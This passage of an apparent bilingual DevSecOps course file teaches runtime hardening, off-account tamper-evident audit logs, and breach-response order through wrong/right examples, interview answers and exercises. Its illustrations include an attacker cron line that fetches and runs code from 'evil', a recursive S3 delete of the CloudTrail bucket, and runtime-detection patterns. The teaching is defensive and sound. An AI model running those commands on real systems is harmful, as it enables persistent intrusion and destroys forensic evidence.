  #    ransomware / data exfil) - the exact commands, tested.
  #  - BREAK-GLASS: a documented, audited path to emergency admin (e.g. a PAM
  #    tool that grants 1h + logs it, or a sealed credential + 2-person rule).
  #  - COMMS templates: customer notice, status page, regulator notice, exec brief.
  #  - CONTACTS: legal, PR, the DPA, cyber-insurance, key vendors - with numbers.
  # then RUN A GAME DAY (Module 17 L5) against it twice a year. the runbook that
  # has never been exercised is a draft.`,
        why: 'The quality of incident response is determined almost entirely by what exists before the incident. When the response process is invented in real time at 2am, the first hour — the most valuable hour, when containment matters most — is spent on questions that should have been answered in advance: who is in charge, who has the access to act, where the emergency procedures are, what to tell customers. Meanwhile an untrained responder acting alone tends to make things worse, restarting the compromised workload and destroying the forensic state, running exploratory commands that contaminate the timeline, and taking irreversible actions without a second opinion. The preparation that changes this is concrete and testable: a written runbook linked directly from the alert, defined roles with named people and named backups, per-scenario containment playbooks with the exact tested commands, a documented and audited break-glass path to emergency access, pre-written communication templates for customers and regulators, and a contact list for legal, PR, the data protection authority, and cyber-insurance. And the runbook has to be exercised — a game day twice a year, as in Module 17 Lesson 5 — because a procedure that has only ever been read is a draft, and the gaps only become visible when someone tries to follow it under pressure.',
        whyHi: 'Incident response ki quality लगभग poori tarah is se determine hoती hai jо incident se pehle exist karता hai. Jab response process 2am par real time mein invent hoता hai, pehla ghanta — sabse valuable ghanta — un sawaalon par spend hoता hai jinhe advance mein answer hona chahिए tha: kaun in charge hai, kiske paas act karने ka access hai, emergency procedures kahaan hain. Is dौraan ek untrained responder akele act karता hua cheezein worse banाता hai, compromised workload restart karके aur forensic state destroy karके. Preparation jо ise badalती hai concrete aur testable hai: alert se directly linked ek written runbook, named people ke saath defined roles, per-scenario containment playbooks, ek documented break-glass path, pre-written communication templates. Aur runbook ko exercise karना hai — saal mein do baar ek game day.',
      },
      {
        wrong: `# audit logs go to the same account / cluster that got compromised
  # CloudTrail -> an S3 bucket in the SAME account, no Object Lock, the prod
  #   role can s3:DeleteObject on it.
  # k8s audit log -> a file on the node / a Loki in the same cluster.
  # the attacker gets prod admin (or root on a node). first thing they do:
  #   aws s3 rm s3://acme-cloudtrail/ --recursive
  #   ... and truncate the audit log file.
  # now the investigation has NOTHING. you can't establish the entry point, the
  # timeline, what was accessed, or whether they're still in. the breach is
  # effectively invisible - you know it happened but not what happened.`,
        right: `# logs go somewhere the compromised environment cannot touch
  #  - CloudTrail -> an S3 bucket in a SEPARATE "log archive" account, with
  #    Object Lock (COMPLIANCE mode, e.g. 400 days) + an SCP denying deletion
  #    even to that account's root. org-trail, not per-account.
  #  - k8s API audit -> shipped off-cluster in real time (a webhook backend to a
  #    SIEM in the log account), not just a file on the node.
  #  - secret-manager audit (Vault) -> its own append-only sink (Lesson 2).
  #  - the prod environment has NO credentials that can write or delete in the
  #    log account. the log account is write-once from prod's perspective.
  # now a full prod compromise still leaves the evidence intact, in an account
  # the attacker never had access to. the timeline is reconstructable.`,
        why: 'Audit logs only serve their purpose during an incident if the party being investigated cannot alter them, and storing them in the same account or cluster that can be compromised fails that test completely. An attacker who reaches production admin or node root, which is the scenario the logs exist to help with, can as their first action delete the CloudTrail bucket and truncate the Kubernetes audit file, and then the investigation has nothing to work from — no entry point, no timeline, no record of what was accessed or exfiltrated, no way to tell whether the attacker still has a foothold. The breach becomes known but not understood. The fix is architectural separation: audit trails are delivered in real time to a dedicated log-archive account that production has no credentials to write to or delete from, the storage uses Object Lock in compliance mode so the objects cannot be deleted within the retention period by anyone including that account\'s root, and an organisation-level policy denies the deletion actions outright. The Kubernetes audit stream is shipped off-cluster through a webhook rather than left as a file on a node. With this separation, even a total compromise of production leaves the evidence intact in a place the attacker was never able to reach.',
        whyHi: 'Audit logs sirf tab apna purpose serve karते hain ek incident ke dauraan agar jо party investigate ki ja rahी hai unhe alter nahi kar sakती, aur unhe usi account ya cluster mein store karना jо compromised ho sakта hai us test ko completely fail karता hai. Ek attacker jо production admin ya node root tak pahunचता hai apni pehli action ke roop mein CloudTrail bucket delete kar sakта hai aur Kubernetes audit file truncate kar sakта hai, aur phir investigation ke paas kaam karने ke liye kुछ nahi hai. Fix architectural separation hai: audit trails real time mein ek dedicated log-archive account ko delivered hoते hain jismein production ke paas likhने ya delete karने ke liye koi credentials nahi hain, storage compliance mode mein Object Lock use karता hai. Is separation ke saath, production ka ek total compromise bhi evidence ko intact chhodता hai.',
      },
      {
        wrong: `# "clean" the compromised host instead of rebuilding it
  # incident: a webshell found on an app server (a VM, or a node).
  # response: kill the webshell process, 'rm' the webshell file, change the one
  #   password that was in the config, put the server back in the load balancer.
  #   "it's clean now."
  # what was missed: a cron job the attacker added ('* * * * * curl evil|sh'), a
  #   modified systemd unit, an added SSH authorized_key, a backdoored binary in
  #   /usr/local/bin, a kernel module. any ONE of these = they're back tonight.
  # you cannot prove a compromised host is clean. you can only prove a fresh one
  # is what you built.`,
        right: `# rebuild from known-good; treat the compromised host as forensic-only
  #  1. snapshot the compromised host (disk + memory) -> forensics copy.
  #  2. isolate it (out of the LB, deny-all network, keep it running for analysis
  #     OR power off and keep the disk).
  #  3. provision a NEW host from the golden image / re-run the IaC. it has none
  #     of the attacker's changes because it was never touched.
  #  4. patch the entry point in the image/config BEFORE the new host serves.
  #  5. rotate every credential that was on the old host.
  #  6. restore data from a backup taken BEFORE the compromise window if data
  #     integrity is in question.
  #  7. monitor the new host closely for re-entry (the attacker may still have a
  #     valid path you haven't found).
  # immutable infra (Module 12) makes this the normal, fast path.`,
        why: 'It is not possible to prove that a compromised host has been fully cleaned. An attacker with code execution and any persistence goal will have established multiple footholds — a cron entry, a modified service unit, an added SSH key, a replaced system binary, a loaded kernel module, a poisoned shell profile — and finding and removing all of them by inspection is a losing game, because you only need to miss one for the attacker to return, often within hours. Killing the visible process and deleting the obvious file addresses the part of the intrusion you can see and leaves the part you cannot. The correct response treats the compromised host as forensic evidence only: snapshot it, isolate it, and never trust it again. A replacement is provisioned fresh from a known-good image or by re-running the infrastructure code, so it contains none of the attacker\'s modifications by construction; the entry point is patched in the image before the new host takes traffic; every credential that lived on the old host is rotated; and if data integrity is in doubt, data is restored from a backup predating the compromise. Immutable infrastructure, from Module 12, makes rebuild-not-clean the normal operating pattern rather than an emergency measure.',
        whyHi: 'Ye saabit karना possible nahi hai ki ek compromised host poori tarah clean kiya gaya hai. Code execution aur koi persistence goal wale ek attacker ne multiple footholds establish kiye honge — ek cron entry, ek modified service unit, ek added SSH key, ek replaced system binary — aur inhe inspection se find aur remove karना ek losing game hai, kyunki aapko sirf ek miss karना hai attacker ke wapas aane ke liye. Visible process ko kill karना aur obvious file delete karना intrusion ke us hisse ko address karता hai jо aap dekh sakते ho aur us hisse ko chhodता hai jо aap nahi. Correct response compromised host ko sirf forensic evidence treat karता hai: ise snapshot karो, isolate karो, aur ise phir kabhi trust mat karो. Ek replacement ek known-good image se fresh provisioned hoता hai. Immutable infrastructure, Module 12 se, rebuild-not-clean ko normal operating pattern banाता hai.',
      },
    ],

    realWorld: [
      {
        en: '**Capital One (2019)** — SSRF → IMDSv1 → an over-privileged WAF role → ~100M records. The remediations map directly onto this module and Lesson 5: IMDSv2, least-privilege roles, egress restrictions, and detection on anomalous S3 access. It also drove wide adoption of tamper-evident, separate-account logging.',
        hi: '**Capital One (2019)** — SSRF → IMDSv1 → ek over-privileged WAF role → ~100M records. Remediations directly is module aur Lesson 5 par map karते hain: IMDSv2, least-privilege roles, egress restrictions.',
      },
      {
        en: '**The value of a rehearsed runbook** — companies that run regular security game days (injecting a simulated breach) consistently report containment times in minutes rather than hours on the real thing, and far fewer "we destroyed the evidence" / "we missed the persistence" mistakes. The delta is almost entirely preparation, not tooling.',
        hi: '**Ek rehearsed runbook ki value** — jо companies regular security game days chalाती hain wo consistently real cheez par hours ke bजाy minutes mein containment times report karती hain, aur bahut kम "humne evidence destroy kiya" mistakes.',
      },
      {
        en: '**Falco / runtime detection catching post-exploitation** — many disclosed intrusions were first noticed not by the vulnerability being flagged but by runtime detection seeing the *consequence*: a shell in a container, a connection to a mining pool, a serviceaccount token read by curl. Preventive controls fail; the thing that shortens dwell time is watching behaviour.',
        hi: '**Falco / runtime detection post-exploitation catch karта hua** — kई disclosed intrusions pehle vulnerability flag hone se nahi balki runtime detection dwara *consequence* dekhne se notice kiye गए: ek container mein ek shell, ek mining pool se ek connection. Preventive controls fail hote hain; jо dwell time chhota karता hai wo behaviour watch karना hai.',
      },
    ],

    interviewQA: [
      {
        q: 'What does "runtime hardening" cover beyond image and supply-chain security, and which controls are highest-value?',
        qHi: '"Runtime hardening" image aur supply-chain security ke aage kya cover karता hai, aur konse controls highest-value hain?',
        a: 'Runtime hardening is the set of controls that operate while the system is running and under attack, as opposed to the build-time controls from earlier modules. It spans five areas. Host and node hardening: applying CIS Benchmarks with tools like kube-bench, running a minimal immutable node OS such as Bottlerocket or Talos that has no SSH or package manager and is patched by replacement, and confining containers with seccomp and AppArmor or SELinux, with Pod Security Standards restricted enforced at admission. TLS everywhere including between pods, and mutual TLS between services so every internal call carries a verified identity — usually via a service mesh and tied to the workload identity from Lesson 5 — with automated short-lived certificates. Edge protection: a WAF run in monitor mode first then enforced, rate limiting per IP and key and route, bot management, and a DDoS scrubbing provider for volumetric attacks. Tamper-evident audit logging shipped to a separate account or write-once store so a compromise of production cannot erase the record. And runtime threat detection with Falco or a cloud equivalent watching for shells in containers, writes to sensitive paths, and unexpected outbound connections. The highest-value items are the ones that bound the blast radius of a compromise you did not prevent: Pod Security Standards restricted and non-root, default-deny NetworkPolicy, tamper-evident logging in a separate account, and runtime detection — because preventive controls fail and these are what limit and reveal the damage.',
        aHi: 'Runtime hardening wo controls ka set hai jо system ke running aur attack ke tehat hone ke dauraan operate karते hain. Ye paanch areas span karता hai. Host aur node hardening: CIS Benchmarks apply karना, ek minimal immutable node OS chalाना, aur containers ko seccomp aur AppArmor se confine karना, Pod Security Standards restricted admission par enforced ke saath. Har jagah TLS pods ke beech bhi, aur services ke beech mutual TLS. Edge protection: pehle monitor mode mein ek WAF, rate limiting, aur volumetric attacks ke liye ek DDoS scrubbing provider. Tamper-evident audit logging ek separate account ko shipped. Aur Falco ke saath runtime threat detection. Highest-value items wo hain jо ek compromise ke blast radius ko bound karते hain jise aapne prevent nahi kiya: Pod Security Standards restricted, default-deny NetworkPolicy, ek separate account mein tamper-evident logging, aur runtime detection.',
      },
      {
        q: 'Why must audit logs be tamper-evident and stored separately, and what specifically breaks if they are not?',
        qHi: 'Audit logs tamper-evident aur separately stored kyun hone chahिए, aur specifically kya toot jaता hai agar wo nahi hain?',
        a: 'Audit logs exist to reconstruct what happened during an incident, and the party whose actions they record is exactly the party you cannot allow to alter them. If the logs live in the same cloud account or the same cluster that gets compromised, then an attacker who reaches production admin or node root — which is the scenario the logs are meant to help investigate — can delete the CloudTrail bucket and truncate the Kubernetes audit file as one of their first actions, and often does, precisely to blind the response. What breaks then is the entire investigation: you cannot establish the entry point, so you do not know what to patch; you cannot build the timeline, so you do not know the scope; you cannot see what data was accessed or exfiltrated, so you cannot disclose accurately; and you cannot tell whether the attacker still has a foothold, so you do not know when it is over. The breach becomes known but not understood, which is close to the worst position to be in with regulators and customers. The fix is separation: audit trails are delivered in real time to a dedicated log-archive account that production has no write or delete credentials for, the storage uses Object Lock in compliance mode so objects cannot be removed within the retention window by anyone including root, an organisation policy denies deletion outright, and the Kubernetes audit stream is shipped off-cluster via a webhook rather than kept as a node file. Then a full compromise of production still leaves a complete, trustworthy record in a place the attacker never had access to.',
        aHi: 'Audit logs exist karते hain ye reconstruct karने ke liye ki ek incident ke dauraan kya hua, aur jिस party ki actions wo record karते hain wo exactly wo party hai jise aap unhe alter karने nahi de sakte. Agar logs usi cloud account ya usi cluster mein rehते hain jо compromised hoता hai, to ek attacker jо production admin tak pahunचता hai CloudTrail bucket delete kar sakта hai aur Kubernetes audit file truncate kar sakта hai apni pehli actions mein se ek ke roop mein. Phir jо toot jaता hai wo poori investigation hai: aap entry point establish nahi kar sakte, aap timeline nahi bana sakte, aap nahi dekh sakte ki kya data accessed hua. Fix separation hai: audit trails real time mein ek dedicated log-archive account ko delivered hoते hain jismein production ke paas koi write ya delete credentials nahi hain.',
      },
      {
        q: 'Walk through the breach-response order of operations and explain the cost of getting each step wrong.',
        qHi: 'Breach-response operations ke order ke through chalो aur har step ko galat karने ki cost samjhाओ.',
        a: 'The order is prepare, declare and contain, rotate, investigate, eradicate and recover, disclose, postmortem. Preparation happens before any incident: a written runbook, an on-call rota, defined roles, tested break-glass access, communication templates, contact lists, and backups you have restored from — without it the first hour is spent inventing process instead of executing it. Contain first: isolate the affected workload or account by revoking credentials and cutting network, and snapshot it for forensics rather than deleting it — deleting the pod or "cleaning" the host destroys the evidence you most need and, in the clean case, leaves persistence you did not find. Rotate second: every credential the blast radius touched, on the assumption all of it is compromised — skipping this leaves copied short-lived credentials valid long enough for the attacker to re-enter, and copied long-lived ones valid indefinitely. Investigate third, from the tamper-evident logs: entry point, timeline, what was accessed, whether the attacker is still in — investigating from logs the attacker could reach means investigating a record they may have edited. Eradicate and recover fourth: rebuild from known-good rather than cleaning, patch the entry point before the replacement serves traffic, restore data if needed — cleaning instead of rebuilding is how the attacker is back that night. Disclose fifth, within your legal window such as GDPR\'s 72 hours and to affected customers, honestly and specifically — late or vague disclosure turns a contained incident into a regulatory finding and a trust crisis. Postmortem sixth, blameless, with the findings as owned, dated action items.',
        aHi: 'Order hai prepare, declare aur contain, rotate, investigate, eradicate aur recover, disclose, postmortem. Preparation kisi bhi incident se pehle hoती hai — iske bina pehla ghanta process invent karने mein spend hoता hai. Contain pehle: affected workload ko credentials revoke karके aur network cut karके isolate karो, aur ise delete karने ke bजाy forensics ke liye snapshot karो — pod delete karना ya host "clean" karना evidence destroy karता hai. Rotate doosra: har credential jо blast radius ne touch kiya. Investigate teesra, tamper-evident logs se. Eradicate aur recover chौthा: cleaning ke bजाy known-good se rebuild karो. Disclose paanchва, apni legal window ke andar jaise GDPR ke 72 hours. Postmortem chhathा, blameless.',
      },
    ],

    exercises: [
      {
        task: 'In a comment, lay out the five areas of runtime hardening (host/node, TLS+mTLS, edge, audit logging, runtime detection) with the specific controls in each, and note which are highest-value and why.',
        taskHi: 'Ek comment mein, runtime hardening ke paanch areas layout karो aur note karो konse highest-value hain.',
        hint: 'RUNTIME HARDENING = controls that operate WHILE the system runs and is under attack (vs build-time controls from M18). FIVE AREAS: (1) HOST / NODE — CIS Benchmarks (per OS / k8s / cloud checklist; run `kube-bench`, `oscap`, use a CIS-hardened AMI; automate the check, track DRIFT); a MINIMAL IMMUTABLE node OS (Bottlerocket / Flatcar / Talos — no SSH, no package manager, no general userland; patch by REPLACING the node, not `apt upgrade`); SECCOMP (`RuntimeDefault` baseline + a custom profile for high-risk pods) + AppArmor / SELinux (MAC over file paths + caps); POD SECURITY STANDARDS `restricted` enforced AT ADMISSION (non-root, drop caps, no host namespaces / hostPath / privileged, seccomp — M18 L4 as a cluster gate); NO shared node across wildly different trust levels — sensitive workloads on their own node pool / gVisor / Kata (a REAL kernel boundary; namespace isolation alone isn\'t one). (2) TLS EVERYWHERE + mTLS — TLS on EVERY hop INCLUDING pod-to-pod inside the cluster (not private by default; terminate at the edge AND re-encrypt to the pod, or mTLS end-to-end); mTLS BETWEEN SERVICES: each side presents a cert (ideally a SPIFFE SVID tied to workload identity, L5) → every internal call carries identity + encryption → services AUTHORISE each other instead of trusting the network (a service mesh — Istio/Linkerd — or the framework does it); AUTOMATE issuance + rotation (cert-manager + ACME/CA), SHORT-LIVED certs; HSTS, modern ciphers, TLS 1.2+ only, OCSP stapling. (3) EDGE — a WAF (blocks injection / path traversal / known-bad signatures) RUN IN MONITOR MODE FIRST, tuned against real traffic, THEN enforced (a false-positive-prone WAF gets bypassed → protects nothing); RATE LIMITING per IP / per API key / per route (M17 L3), tighter on auth + expensive endpoints; BOT MANAGEMENT (fingerprinting, challenges) for scraping / credential stuffing; DDoS — a SCRUBBING PROVIDER (Cloudflare / AWS Shield / Azure) absorbs volumetric L3/L4 upstream; L7 needs rate limits + caching + autoscaling headroom. (4) AUDIT LOGGING + TAMPER-EVIDENCE — log auth events, admin actions, secret access, config changes, the k8s API audit stream, the cloud audit trail (CloudTrail); SHIP TO A SEPARATE ACCOUNT / A WORM STORE (S3 Object Lock COMPLIANCE mode, an append-only SIEM) — a prod compromise must NOT be able to erase the evidence; NTP time-sync everything (so cross-system timelines line up); retain per policy (often 1yr+). (5) RUNTIME THREAT DETECTION — Falco / a cloud equivalent watches SYSCALLS + k8s events for: "shell spawned in a container", "write to /etc", "outbound to a never-before-seen IP", "a serviceaccount token read by a non-app process", "a mining-pool connection". HIGHEST-VALUE = the controls that BOUND + REVEAL the blast radius of a compromise you did NOT prevent: PSS `restricted` + non-root, DEFAULT-DENY NetworkPolicy, TAMPER-EVIDENT logging in a separate account, RUNTIME DETECTION — because preventive controls fail, and these are what LIMIT the damage and SHORTEN dwell time.',
        hintHi: 'RUNTIME HARDENING = controls jо system ke run hone aur attack ke tehat hone ke DAURAAN operate karते hain. PAANCH AREAS: (1) HOST/NODE — CIS Benchmarks (`kube-bench`, drift track); MINIMAL IMMUTABLE node OS (Bottlerocket/Talos — no SSH, node REPLACE karके patch); SECCOMP + AppArmor/SELinux; POD SECURITY STANDARDS `restricted` ADMISSION par (M18 L4); alag trust levels ke beech NO shared node (gVisor/Kata = REAL kernel boundary). (2) TLS EVERYWHERE + mTLS — HAR hop par, pod-to-pod bhi; services ke beech mTLS (SPIFFE SVID, L5) → identity + encryption; cert-manager + ACME, SHORT-LIVED certs. (3) EDGE — WAF PEHLE MONITOR MODE mein, PHIR enforce; RATE LIMITING (M17 L3); BOT MANAGEMENT; DDoS SCRUBBING PROVIDER. (4) AUDIT LOGGING + TAMPER-EVIDENCE — SEPARATE ACCOUNT / WORM STORE (S3 Object Lock), NTP time-sync. (5) RUNTIME THREAT DETECTION — Falco (shell in container, /etc write, naye IP par outbound). HIGHEST-VALUE = jо compromise ke blast radius ko BOUND + REVEAL karते hain: PSS `restricted`, DEFAULT-DENY NetworkPolicy, SEPARATE-ACCOUNT tamper-evident logging, RUNTIME DETECTION.',
      },
      {
        task: 'In a comment, explain why audit logs must be tamper-evident and in a separate account, exactly what breaks in an investigation if they are not, and the concrete architecture that fixes it.',
        taskHi: 'Ek comment mein, samjhाओ audit logs tamper-evident aur ek separate account mein kyun hone chahिए aur agar nahi to kya toot jaता hai.',
        hint: 'WHY: audit logs exist to RECONSTRUCT what happened during an incident, and the PARTY WHOSE ACTIONS THEY RECORD is EXACTLY the party you cannot allow to alter them. If the logs live in the SAME cloud account / the SAME cluster that gets compromised, an attacker who reaches PROD ADMIN or NODE ROOT — the very scenario the logs are meant to help investigate — can, as ONE OF THEIR FIRST ACTIONS (and often does, deliberately, to blind the response): `aws s3 rm s3://acme-cloudtrail/ --recursive`, truncate the k8s audit log file on the node, delete the Loki data in the same cluster. WHAT BREAKS IN THE INVESTIGATION (all of it): (1) can\'t establish the ENTRY POINT → don\'t know what to patch → the attacker\'s path stays open. (2) can\'t build the TIMELINE → don\'t know the SCOPE / dwell time. (3) can\'t see WHAT DATA was accessed or exfiltrated → can\'t DISCLOSE accurately (a regulatory + legal problem). (4) can\'t tell whether the attacker STILL HAS A FOOTHOLD → don\'t know when it\'s over. The breach becomes KNOWN BUT NOT UNDERSTOOD — close to the worst position with regulators + customers. THE CONCRETE ARCHITECTURE THAT FIXES IT: (a) CloudTrail → an S3 bucket in a SEPARATE "log archive" account (an ORG trail, not per-account), with OBJECT LOCK in COMPLIANCE mode (e.g. 400 days — objects can\'t be deleted within the window by ANYONE, including that account\'s ROOT) + an SCP denying `s3:DeleteObject` / `s3:PutBucketPolicy` org-wide for that bucket. (b) the k8s API audit stream → shipped OFF-CLUSTER IN REAL TIME (a webhook backend to a SIEM in the log account), NOT just a file on the node. (c) the secrets-manager audit (Vault) → its own append-only sink (L2). (d) the prod environment has NO credentials that can write or delete in the log account — from prod\'s perspective the log account is WRITE-ONCE / unreachable. (e) NTP time-sync everything so cross-system events line up on ONE timeline. RESULT: a FULL prod compromise still leaves the evidence INTACT, in an account the attacker NEVER had access to → the timeline is reconstructable.',
        hintHi: 'KYUN: audit logs RECONSTRUCT karने ke liye exist karते hain ki ek incident mein kya hua, aur jिS PARTY KI ACTIONS wo record karते hain wo EXACTLY wo party hai jise aap alter nahi karने de sakte. Agar logs USI account / USI cluster mein rehते hain jо compromised hoता hai, ek attacker jо PROD ADMIN / NODE ROOT tak pahunचता hai apni PEHLI ACTIONS mein: `aws s3 rm --recursive`, k8s audit file truncate, Loki delete. KYA TOOT JAATA HAI: (1) ENTRY POINT establish nahi kar sakte → kya patch karna nahi pata. (2) TIMELINE nahi bana sakte → SCOPE nahi pata. (3) KYA DATA accessed hua nahi dekh sakte → accurately DISCLOSE nahi kar sakte. (4) attacker ABHI BHI ANDAR hai ya nahi nahi pata. Breach KNOWN BUT NOT UNDERSTOOD ban jाता hai. ARCHITECTURE: (a) CloudTrail → ek SEPARATE "log archive" account mein ek S3 bucket, OBJECT LOCK COMPLIANCE mode + ek SCP jо deletion deny karti hai. (b) k8s audit → REAL TIME OFF-CLUSTER shipped (webhook → SIEM). (c) Vault audit → apna append-only sink. (d) prod ke paas log account mein NO write/delete credentials. (e) NTP time-sync. RESULT: FULL prod compromise bhi evidence INTACT chhodता hai.',
      },
      {
        task: 'In a comment, give the breach-response order of operations (0-6), explain why each step is where it is, and give the concrete cost of skipping or reordering each (contain-then-delete, skip rotation, investigate from prod logs, clean-not-rebuild, late disclosure).',
        taskHi: 'Ek comment mein, breach-response operations ka order (0-6) do aur har step ko skip/reorder karने ki concrete cost.',
        hint: 'THE ORDER: 0 PREPARE → 1 DECLARE + CONTAIN → 2 ROTATE → 3 INVESTIGATE → 4 ERADICATE + RECOVER → 5 DISCLOSE → 6 POSTMORTEM. Preparation + the ORDER matter MORE than the tooling. (0) PREPARE (BEFORE any incident): a WRITTEN RUNBOOK linked from the alert itself; an on-call ROTA; ROLES (Incident Commander = decides; Comms Lead = external + exec updates; Scribe = the timeline; + SMEs pulled in) with NAMED BACKUPS; per-scenario CONTAINMENT PLAYBOOKS (compromised pod / leaked cloud key / ransomware / data exfil) with EXACT, TESTED commands; a documented + audited BREAK-GLASS path (a PAM tool granting 1h + logging it, or a sealed credential + 2-person rule); COMMS TEMPLATES (customer notice, status page, regulator notice, exec brief); CONTACTS (legal, PR, the DPA, cyber-insurance, key vendors — with numbers); BACKUPS YOU HAVE ACTUALLY RESTORED FROM. Without it, the first + most valuable hour is spent INVENTING process instead of executing it. REHEARSE it — a GAME DAY (M17 L5) twice a year; an un-exercised runbook is a DRAFT. (1) DECLARE + CONTAIN — isolate the affected workload/account: REVOKE its credentials, CUT its network (a deny-all NetworkPolicy / SG), SNAPSHOT disk + memory for forensics, scale to 0. COST OF `kubectl delete pod` / "clean the host" FIRST: forensics GONE — can\'t tell the entry point, the timeline, or what was taken; and cleaning leaves PERSISTENCE (a cron, a modified systemd unit, an added SSH key, a backdoored binary, a kernel module — miss ONE and they\'re back tonight). (2) ROTATE — EVERY credential the blast radius touched (the L5 exercise gives you the exact list), assuming ALL of it is compromised. COST OF SKIPPING ("the pod\'s dead"): the SHORT-LIVED STS creds the attacker COPIED are still valid for their remaining TTL (15 min) — long enough to write a second payload / re-enter that afternoon; copied LONG-LIVED creds are valid INDEFINITELY. (3) INVESTIGATE — from the TAMPER-EVIDENT logs (separate account, exercise 2): entry point, timeline, what was accessed/exfiltrated, is the attacker STILL IN. COST OF INVESTIGATING FROM PROD LOGS (which the attacker had access to): they deleted the relevant lines — the timeline has a HOLE, and you may "conclude" it\'s contained when it isn\'t. (4) ERADICATE + RECOVER — REBUILD from known-good (a golden image / re-run the IaC — it has NONE of the attacker\'s changes by construction), PATCH the entry point in the image BEFORE the new host serves, restore data from a backup PREDATING the compromise window if integrity is in doubt, monitor closely for re-entry. COST OF "CLEAN NOT REBUILD": you CANNOT prove a compromised host is clean — a missed persistence re-spawns in hours. (Immutable infra, M12, makes rebuild the fast normal path.) (5) DISCLOSE — per legal obligation (GDPR 72h, contracts, sector regulators) + affected customers: honest, specific, timely. COST OF LATE/VAGUE: a regulator FINDING + a trust hit WORSE than the breach itself. (6) POSTMORTEM — BLAMELESS (M15); findings → ACTION ITEMS with OWNERS + DATES (e.g. "libvips wasn\'t in the SBOM scan — fix"; "/incoming should be write-only — fix"; "add a Falco rule for image-tool-spawns-shell with auto-isolate").',
        hintHi: 'ORDER: 0 PREPARE → 1 DECLARE + CONTAIN → 2 ROTATE → 3 INVESTIGATE → 4 ERADICATE + RECOVER → 5 DISCLOSE → 6 POSTMORTEM. (0) PREPARE: alert se linked WRITTEN RUNBOOK; on-call ROTA; ROLES (IC/Comms/Scribe) + NAMED BACKUPS; per-scenario CONTAINMENT PLAYBOOKS (TESTED commands); audited BREAK-GLASS; COMMS TEMPLATES; CONTACTS (legal, PR, DPA, insurance); RESTORED-FROM BACKUPS. REHEARSE — GAME DAY (M17 L5) 2x/yr. (1) CONTAIN — creds REVOKE, network CUT, SNAPSHOT, scale to 0. COST OF DELETE/CLEAN FIRST: forensics GONE + PERSISTENCE missed (cron/systemd/SSH key/binary — miss ONE, wapas aaj raat). (2) ROTATE — HAR credential blast radius ne touch kiya (L5 list). COST OF SKIP: copied STS creds ~15 min valid — re-enter; long-lived INDEFINITELY. (3) INVESTIGATE — TAMPER-EVIDENT logs se. COST OF PROD LOGS: attacker ne lines delete kiye — timeline mein HOLE. (4) REBUILD from known-good, entry point PATCH karo, data restore (pre-compromise), re-entry watch. COST OF CLEAN: clean SAABIT nahi kar sakte — hours mein re-spawn. (5) DISCLOSE — GDPR 72h + customers. COST OF LATE/VAGUE: regulator FINDING + trust hit breach se WORSE. (6) POSTMORTEM — BLAMELESS (M15); ACTION ITEMS + OWNERS + DATES.',
      },
    ],

    keyTakeaways: [
      'RUNTIME HARDENING = five areas of controls that operate while the system runs: (1) HOST/NODE — CIS Benchmarks + `kube-bench`, a minimal immutable node OS (patch by replacement), seccomp + AppArmor/SELinux, Pod Security Standards `restricted` at admission, gVisor/Kata for a real kernel boundary between trust levels; (2) TLS EVERYWHERE incl. pod-to-pod + mTLS between services (SPIFFE SVID, automated short-lived certs); (3) EDGE — WAF in monitor-then-enforce, rate limiting, bot management, DDoS scrubbing; (4) tamper-evident AUDIT LOGGING in a separate account; (5) RUNTIME DETECTION (Falco).',
      'HIGHEST-VALUE runtime controls are the ones that BOUND and REVEAL a compromise you did not prevent: PSS `restricted` + non-root, DEFAULT-DENY NetworkPolicy (ingress AND egress, block the metadata endpoint), tamper-evident logging in a separate account, and runtime threat detection — because preventive controls fail and these limit and shorten the damage.',
      'AUDIT LOGS MUST BE TAMPER-EVIDENT + SEPARATE: an attacker with prod admin / node root will delete the CloudTrail bucket and truncate the k8s audit file as a first move. Ship logs in real time to a dedicated log-archive account (Object Lock COMPLIANCE mode + an SCP denying deletion) that prod has no write/delete credentials for. Without this, a breach becomes "known but not understood" — no entry point, no timeline, no scope, no disclosure basis.',
      'BREACH RESPONSE ORDER (preparation matters more than tooling): 0 PREPARE (written runbook, roles, tested break-glass, comms templates, restored backups — rehearsed in a game day) → 1 CONTAIN (revoke creds + cut network + SNAPSHOT for forensics — never `delete pod` / "clean the host" first) → 2 ROTATE every credential in the blast radius → 3 INVESTIGATE from the tamper-evident logs → 4 REBUILD from known-good (not clean) + patch the entry point → 5 DISCLOSE within the legal window (GDPR 72h) → 6 BLAMELESS POSTMORTEM.',
      'THE COST OF SKIPPING STEPS: delete-first loses forensics + leaves persistence; skip-rotation leaves copied short-lived creds live long enough to re-enter; investigate-from-prod-logs analyses a record the attacker edited; clean-not-rebuild means they\'re back that night (you cannot prove a compromised host is clean); late/vague disclosure turns a contained incident into a regulatory finding worse than the breach.',
    ],
    keyTakeawaysHi: [
      'RUNTIME HARDENING = paanch areas jо system ke run hone ke dauraan operate karते hain: (1) HOST/NODE — CIS Benchmarks + `kube-bench`, ek minimal immutable node OS (replace karके patch), seccomp + AppArmor/SELinux, Pod Security Standards `restricted` admission par, trust levels ke beech ek real kernel boundary ke liye gVisor/Kata; (2) HAR JAGAH TLS pod-to-pod bhi + services ke beech mTLS (SPIFFE SVID); (3) EDGE — WAF monitor-then-enforce, rate limiting, bot management, DDoS scrubbing; (4) ek separate account mein tamper-evident AUDIT LOGGING; (5) RUNTIME DETECTION (Falco).',
      'HIGHEST-VALUE runtime controls wo hain jо ek compromise ko BOUND aur REVEAL karते hain jise aapne prevent nahi kiya: PSS `restricted` + non-root, DEFAULT-DENY NetworkPolicy (ingress AUR egress, metadata endpoint block karो), ek separate account mein tamper-evident logging, aur runtime threat detection.',
      'AUDIT LOGS TAMPER-EVIDENT + SEPARATE HONE CHAHIYE: prod admin / node root wala ek attacker CloudTrail bucket delete karega aur k8s audit file truncate karega ek pehli move ke roop mein. Logs ko real time mein ek dedicated log-archive account ko ship karो (Object Lock COMPLIANCE mode + ek SCP jо deletion deny karti hai) jismein prod ke paas koi write/delete credentials nahi hain. Iske bina, ek breach "known but not understood" ban jाता hai.',
      'BREACH RESPONSE ORDER (preparation tooling se zyada matter karता hai): 0 PREPARE (written runbook, roles, tested break-glass, comms templates, restored backups — ek game day mein rehearsed) → 1 CONTAIN (creds revoke + network cut + forensics ke liye SNAPSHOT — kabhi `delete pod` / "clean the host" pehle nahi) → 2 blast radius mein har credential ROTATE karो → 3 tamper-evident logs se INVESTIGATE karो → 4 known-good se REBUILD karो (clean nahi) + entry point patch karो → 5 legal window ke andar DISCLOSE karो (GDPR 72h) → 6 BLAMELESS POSTMORTEM.',
